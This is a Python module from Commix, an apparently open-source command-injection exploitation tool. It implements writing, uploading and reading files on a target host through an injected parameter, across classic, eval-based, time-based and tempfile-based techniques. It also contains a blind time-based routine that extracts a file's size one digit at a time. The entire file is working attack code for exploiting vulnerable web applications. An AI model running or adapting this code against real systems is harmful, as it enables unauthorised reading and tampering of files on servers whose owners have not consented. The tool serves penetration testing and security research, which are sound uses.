#!/usr/bin/env python
# encoding: UTF-8

"""
This file is part of Commix Project (https://commixproject.com).
Copyright (c) 2014-2025 Anastasios Stasinopoulos (@ancst).

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

For more see the file 'readme/COPYING' for copying permission.
"""

import re
import os
import sys
from src.utils import menu
from src.utils import common
from src.utils import settings
from src.utils import session_handler
from src.core.injections.controller import checks
from src.core.requests import requests
from src.thirdparty.six.moves import urllib as _urllib
from src.thirdparty.colorama import Fore, Back, Style, init

"""
Write to a file on the target host.
"""
def file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  _ = False
  file_to_write, dest_to_write, content = checks.check_file_to_write()
  if settings.TARGET_OS == settings.OS.WINDOWS:
    if technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
      from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
    else:
      from src.core.injections.results_based.techniques.classic import cb_injector as injector
      if settings.TIME_RELATED_ATTACK:
        whitespace = settings.WHITESPACES[0]
        _ = True
    cmd = checks.change_dir(dest_to_write)
    response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
    fname, tmp_fname, cmd = checks.find_filename(dest_to_write, content)
    response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
    cmd = checks.win_decode_b64_enc(fname, tmp_fname)
    response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
    injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
    cmd = checks.delete_tmp(tmp_fname)
    response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
    shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
  else:
    if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
      from src.core.injections.results_based.techniques.classic import cb_injector as injector
    elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
      from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
    elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      from src.core.injections.blind.techniques.time_based import tb_injector as injector
    elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
      from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
    else:
      from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector
    cmd = checks.write_content(content, dest_to_write)
    if settings.TIME_RELATED_ATTACK:
      cmd = cmd + _urllib.parse.quote(separator) + settings.FILE_READ + dest_to_write
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
      else:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    else:
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
        cmd = cmd + settings.COMMENT
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
      else:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
      shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
    shell = "".join(str(p) for p in shell)
  cmd = checks.check_file(dest_to_write)
  if settings.TIME_RELATED_ATTACK:
    if settings.VERBOSITY_LEVEL == 0 and not _:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
      else:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
  else:
    if settings.USE_BACKTICKS:
      cmd = checks.remove_command_substitution(cmd)
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
      response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
    else:
      response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
    shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
  shell = "".join(str(p) for p in shell)
  if settings.TIME_RELATED_ATTACK:
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  checks.file_write_status(shell, dest_to_write)

"""
Upload a file on the target host.
"""
def file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector
  cmd, dest_to_upload = checks.check_file_to_upload()
  if settings.TIME_RELATED_ATTACK:
    if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
      check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
    else:
      check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
  else:
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
      response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
    else:
      response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
    shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
  shell = "".join(str(p) for p in shell)
  cmd = checks.check_file(dest_to_upload)
  if settings.TIME_RELATED_ATTACK:
    check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
  else:
    if settings.USE_BACKTICKS:
      cmd = checks.remove_command_substitution(cmd)
    if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
      response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
    else:
      response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
    shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
  shell = "".join(str(p) for p in shell)
  if settings.TIME_RELATED_ATTACK:
    if settings.VERBOSITY_LEVEL == 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  checks.file_upload_status(shell, dest_to_upload)


"""
Read a file from the target host.
"""
def file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if technique == settings.INJECTION_TECHNIQUE.CLASSIC:
    from src.core.injections.results_based.techniques.classic import cb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.DYNAMIC_CODE:
    from src.core.injections.results_based.techniques.eval_based import eb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_injector as injector
  elif technique == settings.INJECTION_TECHNIQUE.FILE_BASED:   
    from src.core.injections.semiblind.techniques.file_based import fb_injector as injector
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_injector as injector
  _ = False
  cmd, file_to_read = checks.file_content_to_read()
  if session_handler.export_stored_cmd(url, cmd, vuln_parameter) == None or menu.options.ignore_session:
    if settings.TIME_RELATED_ATTACK:
      if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique)
      else:
        check_exec_time, shell = injector.injection(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
      session_handler.store_cmd(url, cmd, shell, vuln_parameter)
      _ = True
    else:
      if technique == settings.INJECTION_TECHNIQUE.FILE_BASED:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, technique)
      else:
        response = injector.injection(separator, TAG, cmd, prefix, suffix, whitespace, http_request_method, url, vuln_parameter, alter_shell, filename, technique)
        if settings.URL_RELOAD:
          response = requests.url_reload(url, timesec)
      shell = injector.injection_results(response, TAG, cmd, technique, url, OUTPUT_TEXTFILE, timesec)
      shell = "".join(str(p) for p in shell)
  else:
    shell = session_handler.export_stored_cmd(url, cmd, vuln_parameter)
  shell = "".join(str(p) for p in shell)
  if settings.TIME_RELATED_ATTACK:
    if settings.VERBOSITY_LEVEL == 0 and _ and len(shell) != 0:
      settings.print_data_to_stdout(settings.SINGLE_WHITESPACE)
  checks.file_read_status(shell, file_to_read, filename)

"""
Check the defined options
"""
def do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if menu.options.file_write:
    file_write(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_upload:
    if settings.TARGET_OS == settings.OS.WINDOWS:
      check_option = "--file-upload"
      checks.unavailable_option(check_option)
    else:
      file_upload(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    settings.FILE_ACCESS_DONE = True

  if menu.options.file_read:
    file_read(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
    settings.FILE_ACCESS_DONE = True

"""
Check stored session
"""
def stored_session(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique):
  if settings.FILE_ACCESS_DONE == True :
    while True:
      message = "Do you want to ignore stored session and access files again? [y/N] > "
      file_access_again = common.read_input(message, default="N", check_batch=True)
      if file_access_again in settings.CHOICE_YES:
        if not menu.options.ignore_session:
          menu.options.ignore_session = True
        do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)
        break
      elif file_access_again in settings.CHOICE_NO:
        break
      elif file_access_again in settings.CHOICE_QUIT:
        raise SystemExit()
      else:
        common.invalid_option(file_access_again)
        pass
  else:
    if menu.file_access_options():
      do_check(separator, maxlen, TAG, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, OUTPUT_TEXTFILE, alter_shell, filename, url_time_response, technique)

"""
Efficient file size detection for Issue #783 improvement
Enhanced file_read function with O(log n) file size detection
"""
def efficient_file_size_detection(separator, cmd, prefix, suffix, whitespace, timesec, http_request_method, url, vuln_parameter, alter_shell, filename, url_time_response, technique):
  """
  Efficiently detect file size using stat command instead of incremental length checking.
  This significantly reduces the number of requests needed for file size detection.
  Works for both time-based and tempfile-based techniques.
  """
  if technique == settings.INJECTION_TECHNIQUE.TIME_BASED:
    from src.core.injections.blind.techniques.time_based import tb_payloads as payloads
  else:
    from src.core.injections.semiblind.techniques.tempfile_based import tfb_payloads as payloads
  
  # Extract filename from the command
  filename_to_check = checks.extract_filename_from_cmd(cmd)
  if not filename_to_check:
    return None, "Could not extract filename from command"
  
  if settings.VERBOSITY_LEVEL != 0:
    debug_msg = "Using efficient file size detection for: " + filename_to_check
    settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
  
  # Step 1: Check if file exists (if available for the technique)
  if hasattr(payloads, 'file_exists_check'):
    payload = payloads.file_exists_check(filename_to_check, separator, timesec, http_request_method)
    exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
    
    if not (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
      return None, "File does not exist: " + filename_to_check
  
  # Step 2: Check if file is not empty (if available for the technique)
  if hasattr(payloads, 'file_not_empty_check'):
    payload = payloads.file_not_empty_check(filename_to_check, separator, timesec, http_request_method)
    exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
    
    if not (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
      return 0, "File is empty: " + filename_to_check
  
  # Step 3: Get the length of file size (number of digits) - core functionality
  if not hasattr(payloads, 'get_stat_output_length'):
    return None, "Efficient detection not supported for this technique"
    
  info_msg = "Detecting file size length for: " + filename_to_check
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  
  size_length = None
  for length_test in range(1, 15):  # File sizes up to 999TB (14 digits)
    payload = payloads.get_stat_output_length(filename_to_check, length_test, separator, timesec, http_request_method)
    exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
    
    if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
      size_length = length_test
      if settings.VERBOSITY_LEVEL != 0:
        debug_msg = "File size has " + str(size_length) + " digits"
        settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
      break
  
  if size_length is None:
    return None, "Could not determine file size length"
  
  # Step 4: Extract each digit of the file size
  if not hasattr(payloads, 'get_file_size_digit'):
    return None, "Digit extraction not supported for this technique"
    
  info_msg = "Extracting file size digits for: " + filename_to_check
  settings.print_data_to_stdout(settings.print_info_msg(info_msg))
  
  file_size = ""
  for digit_pos in range(1, size_length + 1):
    digit_found = None
    for digit_value in range(0, 10):  # Test digits 0-9
      payload = payloads.get_file_size_digit(filename_to_check, digit_pos, digit_value, separator, timesec, http_request_method)
      exec_time, vuln_parameter, payload, prefix, suffix = requests.perform_injection(prefix, suffix, whitespace, payload, vuln_parameter, http_request_method, url)
      
      if (exec_time >= settings.FOUND_EXEC_TIME and exec_time - timesec >= settings.FOUND_DIFF):
        digit_found = digit_value
        file_size += str(digit_value)
        if settings.VERBOSITY_LEVEL != 0:
          debug_msg = "Found digit " + str(digit_pos) + ": " + str(digit_value)
          settings.print_data_to_stdout(settings.print_debug_msg(debug_msg))
        break
    
    if digit_found is None:
      return None, "Could not determine digit at position " + str(digit_pos)
  
  try:
    final_size = int(file_size)
    success_msg = "Efficiently detected file size: " + str(final_size) + " bytes"
    settings.print_data_to_stdout(settings.print_info_msg(success_msg))
    return final_size, "Success"
  except ValueError:
    return None, "Invalid file size detected: " + file_size

# eof